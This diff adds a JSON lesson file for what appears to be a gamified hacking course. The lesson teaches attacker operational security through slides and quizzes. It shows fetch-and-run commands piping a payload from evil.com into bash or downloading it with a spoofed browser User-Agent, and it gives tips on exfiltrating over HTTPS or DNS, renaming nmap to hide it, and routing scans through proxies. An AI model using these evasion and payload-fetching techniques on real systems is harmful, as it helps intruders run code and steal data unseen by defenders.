@@ -1,0 +1,95 @@
+{
+    "id": "l4",
+    "chapterId": "ch_12",
+    "title": "The OPSEC Mindset: Thinking Like a Ghost",
+    "description": "Beyond tools—develop the operational security mindset to avoid leaving traces in the first place.",
+    "xpReward": 30,
+    "estimatedMinutes": 7,
+    "section": "OPSEC Principles",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "What is OPSEC? 🕵️",
+            "content": "# Operational Security\n\nOPSEC is a process, not a tool. It's the discipline of identifying, controlling, and protecting information that could be used against you.\n\n### The OPSEC Five-Step Process:\n1.  **Identify Critical Information**: What do I need to protect? (My IP address, my username, the fact that I was even here).\n2.  **Analyze Threats**: Who is watching? (System admins, Blue Team, automated SIEM, honeypots).\n3.  **Analyze Vulnerabilities**: How can they see me? (Logs, network traffic, timestamps).\n4.  **Assess Risks**: What happens if they see me? (Alarm raised, IP blocked, legal action).\n5.  **Apply Countermeasures**: How do I stop them from seeing me? (Encryption, proxies, memory-only execution).\n\n**The Hacker's Mantra:** \"Leave no trace. If you must leave a trace, make it look normal.\""
+        },
+        {
+            "id": "s_l4_2",
+            "type": "text",
+            "title": "Countermeasure 1: Memory-Only Execution 🧠",
+            "content": "# Don't Touch the Disk\n\nIf you never write a file to the hard drive, there is nothing to delete or recover.\n\n### Technique: In-Memory Scripts\nDownload and execute a script directly into memory using `curl` or `wget` piped to `bash`.\n```bash\ncurl -s http://evil.com/payload.sh | bash\n```\n\n**Pros:** No file is created on disk. Antivirus scanning the filesystem sees nothing.\n**Cons:** The command line itself is recorded in `~/.bash_history` (and potentially auditd) unless you clear it. The network connection is still logged.\n\n### Technique: `memfd_create` (Advanced)\nMalware often uses the `memfd_create` syscall to create an anonymous file in RAM that behaves like a real file but exists only in memory. This is how sophisticated rootkits hide."
+        },
+        {
+            "id": "s_l4_3",
+            "type": "quiz",
+            "title": "OPSEC Principles 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "What is the primary advantage of piping `curl` directly into `bash`?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "It encrypts the payload.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "No file is written to the filesystem.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "It bypasses the firewall.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Piping streams the content directly into the shell's memory, avoiding disk writes.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_4",
+            "type": "text",
+            "title": "Countermeasure 2: Network Anonymization 🌐",
+            "content": "# Hide Your True IP Address\n\nLogs are useless if they point to a coffee shop in another country instead of your house.\n\n### Tools of the Trade:\n- **VPN (Virtual Private Network)**: Encrypts traffic and masks IP. **Trusted?** You are shifting trust to the VPN provider.\n- **Tor (The Onion Router)**: Multi-layered encryption, very hard to trace. **Slow**, and exit nodes are monitored.\n- **Proxychains**: Force any application to route its traffic through a proxy (SOCKS/HTTP).\n\n### Usage with Nmap (Partial):\n```bash\nproxychains nmap -sT -Pn scanme.nmap.org\n```\n**Crucial:** Only TCP connect scans (`-sT`) work reliably over proxies. SYN scans (`-sS`) bypass the proxy stack and reveal your real IP!"
+        },
+        {
+            "id": "s_l4_5",
+            "type": "text",
+            "title": "Countermeasure 3: Look Like Noise 🎭",
+            "content": "# Hiding in Plain Sight\n\nInstead of deleting logs, make your activity **indistinguishable from normal system behavior**.\n\n- **Use Common Ports**: Exfiltrate data over **HTTPS (443)** or **DNS (53)** . These are rarely blocked and generate massive legitimate traffic.\n- **Mimic User Agents**: If you're using `curl` to download a payload, use the same User-Agent string as a legitimate Chrome browser.\n- **Time Your Attacks**: Run scans during business hours when traffic is high. 3:00 AM scans stick out.\n- **Rename Your Tools**: Don't run `nmap`. Copy `/usr/bin/nmap` to `/tmp/systemd-update` and run that.\n\n### `curl` with Chrome's User-Agent:\n```bash\ncurl -A \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" http://evil.com/payload\n```"
+        },
+        {
+            "id": "s_l4_6",
+            "type": "quiz",
+            "title": "Blending In 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_2",
+                "type": "multiple_choice",
+                "question": "Why is using HTTPS (port 443) for data exfiltration often stealthier than a custom port?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "It is encrypted and blends with normal web traffic.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "It bypasses firewall rules.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "It is faster.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "HTTPS traffic is ubiquitous. Large encrypted blobs on port 443 don't immediately trigger alarms.",
+                "xpReward": 10
+            }
+        }
+    ]
+}
